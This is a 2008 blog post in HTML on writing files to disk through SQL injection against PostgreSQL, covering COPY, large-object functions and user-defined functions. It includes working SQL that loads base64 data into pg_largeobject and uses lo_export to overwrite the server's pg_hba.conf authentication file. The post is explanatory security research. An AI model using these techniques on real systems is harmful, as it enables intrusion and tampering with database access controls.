
<!DOCTYPE html>
<html lang="en">
<head>
  <link href="//fonts.googleapis.com/css?family=Indie+Flower|Source+Sans+Pro" rel="stylesheet">

    <link rel="stylesheet" type="text/css" href="https://jekil.sexy/theme/stylesheet/style.min.css">

  <link rel="stylesheet" type="text/css" href="https://jekil.sexy/theme/pygments/github.min.css">
  <link rel="stylesheet" type="text/css" href="https://jekil.sexy/theme/font-awesome/css/font-awesome.min.css">


    <link href="http://feeds.feedburner.com/jekil_is_sexy" type="application/atom+xml" rel="alternate" title="Alessandro Tanasi @jekil's blog Atom">



  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="HandheldFriendly" content="True" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta name="robots" content="index, follow" />

    <!-- Chrome, Firefox OS and Opera -->
    <meta name="theme-color" content="#333">
    <!-- Windows Phone -->
    <meta name="msapplication-navbutton-color" content="#333">
    <!-- iOS Safari -->
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">

<meta name="author" content="jekil" />
<meta name="description" content="Table of Contents 1. Introduction 2. Default configuration 3. COPY Function 3.1 COPY function abusing 4. BLOB functions 4.1 BLOB functions abusing 5. User defined functions 5.1 User defined functions abusing 6. Conclusions 7. References 1. Introduction The following examples assume access to the database has been achieved through SQL Injection vulnerability in a web application. Sometimes, against best practice, the application has connected to the database using superuser credentials. 2. Default configuration In some systems the configuration files of PostgreSQL are owned by the user used to run the PostgreSQL process. For example in my Ubuntu …" />
<meta name="keywords" content="exploiting, PostgreSQL, SQL Injection, SQLi, writing file">
<meta property="og:site_name" content="Alessandro Tanasi @jekil's blog"/>
<meta property="og:title" content="SQLi: Writing files to disk under PostgreSQL"/>
<meta property="og:description" content="Table of Contents 1. Introduction 2. Default configuration 3. COPY Function 3.1 COPY function abusing 4. BLOB functions 4.1 BLOB functions abusing 5. User defined functions 5.1 User defined functions abusing 6. Conclusions 7. References 1. Introduction The following examples assume access to the database has been achieved through SQL Injection vulnerability in a web application. Sometimes, against best practice, the application has connected to the database using superuser credentials. 2. Default configuration In some systems the configuration files of PostgreSQL are owned by the user used to run the PostgreSQL process. For example in my Ubuntu …"/>
<meta property="og:locale" content="en_US.UTF-8"/>
<meta property="og:url" content="https://jekil.sexy/blog/2008/sqli-writing-files-to-disk-under-postgresql.html"/>
<meta property="og:type" content="article"/>
<meta property="article:published_time" content="2008-12-21 15:03:00+00:00"/>
<meta property="article:modified_time" content=""/>
<meta property="article:author" content="https://jekil.sexy/author/jekil.html">
<meta property="article:section" content="Research"/>
<meta property="article:tag" content="exploiting"/>
<meta property="article:tag" content="PostgreSQL"/>
<meta property="article:tag" content="SQL Injection"/>
<meta property="article:tag" content="SQLi"/>
<meta property="article:tag" content="writing file"/>
<meta property="og:image" content="//en.gravatar.com/userimage/1102835/a961dde28318778e338efdf517ea68cb.png?size=120">

  <title>Alessandro Tanasi @jekil's blog &ndash; SQLi: Writing files to disk under PostgreSQL</title>
</head>
<body>
  <aside>
    <div>
      <a href="https://jekil.sexy">
        <img src="//en.gravatar.com/userimage/1102835/a961dde28318778e338efdf517ea68cb.png?size=120" alt="jekil's blog" title="jekil's blog">
      </a>
      <h1><a href="https://jekil.sexy">jekil's blog</a></h1>

<p>Alessandro Tanasi's thoughts</p>
      <nav>
        <ul class="list">
          <li><a href="https://jekil.sexy/pages/about-me/#about-me">About&nbsp;Me</a></li>
          <li><a href="https://jekil.sexy/pages/projects/#projects">Projects</a></li>

        </ul>
      </nav>

      <ul class="social">
        <li><a class="sc-envelope-o" href="mailto:alessandro@tanasi.it" target="_blank"><i class="fa fa-envelope-o"></i></a></li>
        <li><a class="sc-linkedin" href="https://www.linkedin.com/in/alessandrotanasi" target="_blank"><i class="fa fa-linkedin"></i></a></li>
        <li><a class="sc-github" href="https://github.com/jekil" target="_blank"><i class="fa fa-github"></i></a></li>
        <li><a class="sc-twitter" href="https://twitter.com/jekil" target="_blank"><i class="fa fa-twitter"></i></a></li>
        <li><a class="sc-rss" href="http://feeds.feedburner.com/jekil_is_sexy" target="_blank"><i class="fa fa-rss"></i></a></li>
      </ul>
    </div>
  </aside>
  <main>
    <nav>
      <a href="https://jekil.sexy">    Home
</a>

      <a href="/archives.html">Archives</a>
      <a href="/categories.html">Categories</a>
      <a href="/tags.html">Tags</a>

      <a href="http://feeds.feedburner.com/jekil_is_sexy">    Atom
</a>

    </nav>

<article class="single">
  <header>
    <h1 id="sqli-writing-files-to-disk-under-postgresql">SQLi: Writing files to disk under&nbsp;PostgreSQL</h1>
    <p>
          Posted on December 21, 2008 in <a href="https://jekil.sexy/category/research.html">Research</a>


        &#8226; 6 min read
    </p>
  </header>
  <div>
    <div class="section" id="table-of-contents">
<h2>Table of&nbsp;Contents</h2>
<div class="line-block">
<div class="line">1. Introduction</div>
<div class="line">2. Default configuration</div>
<div class="line">3. <span class="caps">COPY</span> Function</div>
<div class="line">3.1 <span class="caps">COPY</span> function abusing</div>
<div class="line">4. <span class="caps">BLOB</span> functions</div>
<div class="line">4.1 <span class="caps">BLOB</span> functions abusing</div>
<div class="line">5. User defined functions</div>
<div class="line">5.1 User defined functions abusing</div>
<div class="line">6. Conclusions</div>
<div class="line">7. References</div>
</div>
</div>
<div class="section" id="introduction">
<h2>1.&nbsp;Introduction</h2>
<p>The following examples assume access to the database has been achieved
through <span class="caps">SQL</span> Injection vulnerability in a web&nbsp;application.</p>
<p>Sometimes, against best practice, the application has connected to the
database using superuser&nbsp;credentials.</p>
</div>
<div class="section" id="default-configuration">
<h2>2. Default&nbsp;configuration</h2>
<p>In some systems the configuration files of PostgreSQL are owned by the
user used to run the PostgreSQL&nbsp;process.</p>
<p>For example in my Ubuntu laptop the PostgreSQL configuration file are
owned by postgres by default, as you can&nbsp;see:</p>
<div class="highlight"><pre><span></span><span class="gp">$</span> ls -al /etc/postgresql/8.3/main/
<span class="go">total 44</span>
<span class="go">drwxr-xr-x 2 root     root      4096 2008-05-14 00:20 .</span>
<span class="go">drwxr-xr-x 3 root     root      4096 2008-04-12 15:19 ..</span>
<span class="go">-rw-r--r-- 1 root     root       316 2008-04-12 15:20 environment</span>
<span class="go">-rw-r----- 1 postgres postgres  3845 2008-05-13 23:07 pg_hba.conf</span>
<span class="go">-rw-r----- 1 postgres postgres  1460 2008-04-12 15:20 pg_ident.conf</span>
<span class="go">-rw-r--r-- 1 postgres postgres 16682 2008-04-12 15:20 postgresql.conf</span>
<span class="go">-rw-r--r-- 1 root     root       378 2008-04-12 15:20 start.conf</span>
</pre></div>
<p>All the configuration files are owned by postgres user which can write&nbsp;these.</p>
<p>So anyone that can execute a <span class="caps">SQL</span> statement that write files to disk can
try to overwrite a configuration file and do all evil&nbsp;things.</p>
</div>
<div class="section" id="copy-function">
<h2>3. <span class="caps">COPY</span>&nbsp;Function</h2>
<p>The <span class="caps">COPY</span> statement transfers data between PostgreSQL tables and standard
file system&nbsp;files.</p>
<p><span class="caps">COPY</span> <span class="caps">TO</span> statement copies the contents of a table to a file, while <span class="caps">COPY</span>
<span class="caps">FROM</span> copies data from a file to a table (appending the data to whatever
is in the table&nbsp;already).</p>
<p>It can export data as text or PostgreSQL&#8217;s own binary format, which
contains a&nbsp;header.</p>
<p>Using <span class="caps">COPY</span> with a file name instructs the PostgreSQL server to directly
read from or write to a file. The file must be accessible to the server
and the name must be specified from the viewpoint of the server. When
<span class="caps">STDIN</span> or <span class="caps">STDOUT</span> is specified, data is transmitted via the connection
between the client and the&nbsp;server.</p>
<p>In PostgreSQL 8.0 and later the database file locations can be
determined querying system table&nbsp;pg_settings:</p>
<div class="highlight"><pre><span></span><span class="gp">postgres=#</span> <span class="k">SELECT</span> <span class="n">setting</span> <span class="k">FROM</span> <span class="n">pg_settings</span> <span class="k">WHERE</span> <span class="k">name</span><span class="o">=</span><span class="s1">&#39;data_directory&#39;</span><span class="p">;</span>
<span class="go">setting</span>
<span class="go">------------------------------</span>
<span class="go">/var/lib/postgresql/8.3/main</span>
<span class="go">(1 row)</span>
</pre></div>
</div>
<div class="section" id="copy-function-abusing">
<h2>3.1 <span class="caps">COPY</span> function&nbsp;abusing</h2>
<p>The files are accessed under the operating system user privilege that
the database runs as and it&#8217;s available only to database&nbsp;superusers.</p>
<p>The <span class="caps">COPY</span> command does not accept relative paths to prevent the
overwriting of a database file, more explanation of this can be found in
copy.c source&nbsp;file.</p>
<p>So an attacker can use ~ to write in PostgreSQL home directory and must
write files in already known path or a well known directory like&nbsp;/tmp.</p>
<p>The caveat is that the file cannot contain a null byte (0x00) otherwise
proceeding bytes will not be written&nbsp;out.</p>
</div>
<div class="section" id="blob-functions">
<h2>4. <span class="caps">BLOB</span>&nbsp;functions</h2>
<p>PostgreSQL uses large objects, also called Binary Large Objects, to
store very large values and binary data. Large objects permit storage of
any operating system file, including images or large text files,
directly into the&nbsp;database.</p>
<p>It has provided support for <span class="caps">BLOB</span>, also called Large Objects, since
version 4.2. From version 7.2 organized the three large object
interfaces such that all large objects are now placed in the system
table&nbsp;pg_largeobject.</p>
<p>According to the Database Data Type Comparison Sheet[3] there are two
data types used by PostgreSQL to store <span class="caps">BLOB</span>:</p>
<ul class="simple">
<li><span class="caps">BYTEA</span>: used to store small amount of binary data that are stored in the data&nbsp;table</li>
<li><span class="caps">OID</span>: used to store very large amount of binary data in form of file in the&nbsp;filesystem</li>
</ul>
</div>
<div class="section" id="blob-functions-abusing">
<h2>4.1 <span class="caps">BLOB</span> functions&nbsp;abusing</h2>
<p>The file is loaded into the database using lo_import(), and is
retrieved from the database using lo_export(). These functions take a
path as argument that is the path of file to load or the path where
export the data in the <span class="caps">BLOB</span>&nbsp;field.</p>
<p>In detail[2] to export a large object into an operating system file,
call the lo_export() function, with argument that specifies the
operating system name of the&nbsp;file.</p>
<p>Note that the file is written by the client interface library, not by
the server. Returns 1 on success, -1 on&nbsp;failure.</p>
<p>Reading PostgreSQL documentation in the <span class="caps">BLOB</span> section[1] there is the&nbsp;following:</p>
<blockquote>
Files are imported and exported by the postgres user, so postgres must have
permission to read the file for lo_import() and directory write permission for
lo_export().</blockquote>
<p>So this function can write a file to disk and abusing it we can
overwrite the PostgreSQL configuration&nbsp;files.</p>
<p>First of all we need to create a temporary table (if your user have
right permissions) to store our evil&nbsp;data:</p>
<div class="highlight"><pre><span></span><span class="gp">postgres=#</span> <span class="k">CREATE</span> <span class="k">TABLE</span> <span class="n">foo</span> <span class="p">(</span>
<span class="gp">postgres(#</span> <span class="n">bar</span> <span class="n">oid</span><span class="p">,</span>
<span class="gp">postgres(#</span> <span class="n">id</span> <span class="nb">int4</span><span class="p">,</span>
<span class="gp">postgres(#</span> <span class="k">CONSTRAINT</span> <span class="n">id</span> <span class="k">PRIMARY</span> <span class="k">KEY</span> <span class="p">(</span><span class="n">id</span><span class="p">)</span> <span class="p">)</span> <span class="k">WITHOUT</span> <span class="k">OIDS</span><span class="p">;</span>
<span class="gs">NOTICE:</span><span class="go">  CREATE TABLE / PRIMARY KEY will create implicit index &quot;id&quot; for table &quot;foo&quot;</span>
<span class="go">CREATE TABLE</span>
</pre></div>
<p>The easiest way to load a file is using lo_import() that imports a file
from the local file system but if you want to use this you must have a
way to store a file on target&nbsp;system.</p>
<div class="highlight"><pre><span></span><span class="gp">postgres=#</span> <span class="k">INSERT</span> <span class="k">INTO</span> <span class="n">foo</span> <span class="k">VALUES</span> <span class="p">(</span><span class="n">lo_import</span><span class="p">(</span><span class="s1">&#39;/tmp/bar.bin&#39;</span><span class="p">),</span> <span class="mf">1</span><span class="p">);</span>
<span class="go">INSERT 0 1</span>
</pre></div>
<p>Now you can try to abuse of lo_export() to overwrite a PostgreSQL
configuration&nbsp;file.</p>
<p>If the web application connects to PostgreSQL using a user with
superuser permission you can overwrite any configuration file owned by
postgres, here we overwrite&nbsp;pg_hba.conf:</p>
<div class="highlight"><pre><span></span><span class="gp">postgres=#</span> <span class="k">SELECT</span> <span class="n">lo_export</span><span class="p">(</span><span class="n">bar</span><span class="p">,</span> <span class="s1">&#39;/etc/postgresql/8.3/main/pg_hba.conf&#39;</span><span class="p">)</span> <span class="k">FROM</span>
<span class="n">postgres</span><span class="o">+#</span> <span class="n">foo</span> <span class="k">WHERE</span> <span class="n">id</span><span class="o">=</span><span class="mf">1</span><span class="p">;</span>
<span class="go">lo_export</span>
<span class="go">-----------</span>
<span class="go">1</span>
<span class="go">(1 row)</span>
</pre></div>
<p>If the web application runs as a non-superuser user you can get the
following error&nbsp;message:</p>
<blockquote>
Query failed: <span class="caps">ERROR</span>: must be superuser to use server-side lo_export() <span class="caps">HINT</span>:
Anyone can use the client-side lo_export() provided by libpq.</blockquote>
<p>If you are exploiting a <span class="caps">SQL</span> injection you can&#8217;t use lo_import() because
it needs to write files in the local system the pg_largeobject table
can be queried and updated directly, it&#8217;s &#8220;data&#8221; column is the
equivalent to the <span class="caps">BLOB</span> data type found in other <span class="caps">DBMS</span> and is of type
<span class="caps">BYTEA</span>.</p>
<p>Remember that when writing <span class="caps">BYTEA</span> data all non printable characters must
be represented in octal syntax like 00 and the \ must be escaped if you
use it inside a&nbsp;string.</p>
<p>For example 00 becomes 0 inside a&nbsp;string.</p>
<p>A trick is to transfer data encoded in hex or base64 and then decode it
in the database, but remember that this cause an overhead, for example
of 34% of the file size using&nbsp;base64.</p>
<p>Using direct access to pg_largeobject we can transfer an arbitrary file
and then exporting it via&nbsp;lo_export().</p>
<p>First of all you must create a new entry in&nbsp;pg_largeobject.</p>
<div class="highlight"><pre><span></span><span class="gp">postgres=#</span> <span class="k">SELECT</span> <span class="n">lo_create</span><span class="p">(</span><span class="o">-</span><span class="mf">1</span><span class="p">);</span>
<span class="go">lo_create</span>
<span class="go">----------</span>
<span class="go">24586</span>
<span class="go">(1 row)</span>
</pre></div>
<p>And now load your file encoded in base64 (also hex encoding can be&nbsp;used).</p>
<div class="highlight"><pre><span></span><span class="gp">postgres=#</span> <span class="k">UPDATE</span> <span class="n">pg_largeobject</span> <span class="k">SET</span> <span class="k">data</span> <span class="o">=</span> <span class="p">(</span><span class="n">DECODE</span><span class="p">(</span><span class="s1">&#39;YW50YW5p&#39;</span><span class="p">,</span> <span class="s1">&#39;base64&#39;</span><span class="p">))</span>
<span class="n">postgres</span><span class="o">+#</span> <span class="k">WHERE</span> <span class="n">LOID</span> <span class="o">=</span> <span class="mf">24586</span><span class="p">;</span>
<span class="go">UPDATE 1</span>
</pre></div>
<p>Your file is loaded in the target <span class="caps">DBMS</span>, now you can write it to disk
using&nbsp;lo_export().</p>
<div class="highlight"><pre><span></span><span class="gp">postgres=#</span> <span class="k">SELECT</span> <span class="n">lo_export</span><span class="p">(</span><span class="mf">24586</span><span class="p">,</span> <span class="s1">&#39;/etc/postgresql/8.3/main/pg_hba.conf&#39;</span><span class="p">);</span>
<span class="go">lo_export</span>
<span class="go">-----------</span>
<span class="go">1</span>
<span class="go">(1 row)</span>
</pre></div>
</div>
<div class="section" id="user-defined-functions">
<h2>5. User defined&nbsp;functions</h2>
<p>The PostgreSQL functionalities can be extended user-defined functions,
data types, triggers, etc[6] written in C or other&nbsp;languages.</p>
<p>By default only superuser can create new functions using language&nbsp;C.</p>
</div>
<div class="section" id="user-defined-functions-abusing">
<h2>5.1 User defined functions&nbsp;abusing</h2>
<p>Using a user-defined function is possible to define function to open,
create and write&nbsp;files.</p>
<p>The code is not too short and described by Nico Leidecker[5] and also is
the author of pgshell[7], a tool to automatize the exploitation&nbsp;process.</p>
</div>
<div class="section" id="conclusions">
<h2>6.&nbsp;Conclusions</h2>
<p>Exploiting a <span class="caps">SQL</span> injection to write files in to the attacked system disk
can be done in three ways but as you can see in the following comparison
table you can do it only if the database user is a&nbsp;superuser.</p>
<table border="1" class="docutils">
<colgroup>
<col width="62%" />
<col width="26%" />
<col width="12%" />
</colgroup>
<tbody valign="top">
<tr><td>&nbsp;</td>
<td>Super user</td>
<td>User</td>
</tr>
<tr><td>Write files with <span class="caps">COPY</span></td>
<td><span class="caps">YES</span></td>
<td><span class="caps">NO</span></td>
</tr>
<tr><td>Write files with lo_export()</td>
<td><span class="caps">YES</span></td>
<td><span class="caps">NO</span></td>
</tr>
<tr><td>Write file via extension</td>
<td><span class="caps">YES</span></td>
<td><span class="caps">NO</span></td>
</tr>
</tbody>
</table>
<p>So in the case we aren&#8217;t superuser a privilege escalation
vulnerability can be user to upload files.
If you achieve the capability to upload files you can overwrite the
PostgreSQL configuration&nbsp;files.</p>
<p><strong>7.&nbsp;References</strong></p>
<div class="line-block">
<div class="line">[1]
<a class="reference external" href="http://www.postgresql.org/files/documentation/books/aw_pgsql/node96.html">http://www.postgresql.org/files/documentation/books/aw_pgsql/node96.html</a></div>
<div class="line">[2] <a class="reference external" href="http://www.postgresql.org/docs/8.3/interactive/lo-interfaces.html">http://www.postgresql.org/docs/8.3/interactive/lo-interfaces.html</a></div>
<div class="line">[3]
<a class="reference external" href="http://www.lonerunners.net/1246-database-datatype-comparison-sheet.html">http://www.lonerunners.net/1246-database-datatype-comparison-sheet.html</a></div>
<div class="line">[4] <a class="reference external" href="http://www.postgresql.org/docs/8.1/interactive/sql-copy.html">http://www.postgresql.org/docs/8.1/interactive/sql-copy.html</a></div>
<div class="line">[5]
<a class="reference external" href="http://labs.portcullis.co.uk/download/Having_Fun_With_PostgreSQL.pdf">http://labs.portcullis.co.uk/download/Having_Fun_With_PostgreSQL.pdf</a></div>
<div class="line">[6]
<a class="reference external" href="http://www.postgresql.org/docs/8.3/interactive/server-programming.html">http://www.postgresql.org/docs/8.3/interactive/server-programming.html</a></div>
<div class="line">[7] <a class="reference external" href="http://www.leidecker.info/projects/pgshell.shtml">http://www.leidecker.info/projects/pgshell.shtml</a></div>
</div>
</div>

  </div>
  <div class="tag-cloud">
    <p>
      <a href="https://jekil.sexy/tag/exploiting.html">exploiting</a>
      <a href="https://jekil.sexy/tag/postgresql.html">PostgreSQL</a>
      <a href="https://jekil.sexy/tag/sql-injection.html">SQL Injection</a>
      <a href="https://jekil.sexy/tag/sqli.html">SQLi</a>
      <a href="https://jekil.sexy/tag/writing-file.html">writing file</a>
    </p>
  </div>

  <div class="center social-share">
    <p>    Like this article? Share it with your friends!
</p>
    <div class="addthis_native_toolbox"></div>
    <div class="addthis_sharing_toolbox"></div>
  </div>


<div id="disqus_thread"></div>
<script type="text/javascript">
    var disqus_shortname = 'jekilsexy';
    (function() {
        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();
</script>
<noscript>
        Please enable JavaScript to view comments.

</noscript>
</article>

    <footer>
<p>
  &copy; Alessandro Tanasi 2020 - This work is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by-sa/4.0/">Creative Commons Attribution-ShareAlike 4.0 International License</a>
</p>

<p>
</p>    </footer>
  </main>

<!-- Google Analytics -->
<script type="text/javascript">
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-2317228-19', 'auto');
  ga('send', 'pageview');
</script>
<!-- End Google Analytics -->

    <script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-581885fa6aad787e" async="async"></script>


<script type="application/ld+json">
{
  "@context" : "http://schema.org",
  "@type" : "Blog",
  "name": " Alessandro Tanasi @jekil's blog ",
  "url" : "https://jekil.sexy",
  "image": "//en.gravatar.com/userimage/1102835/a961dde28318778e338efdf517ea68cb.png?size=120",
  "description": "Alessandro Tanasi's Thoughts and Writings"
}
</script>
</body>
</html>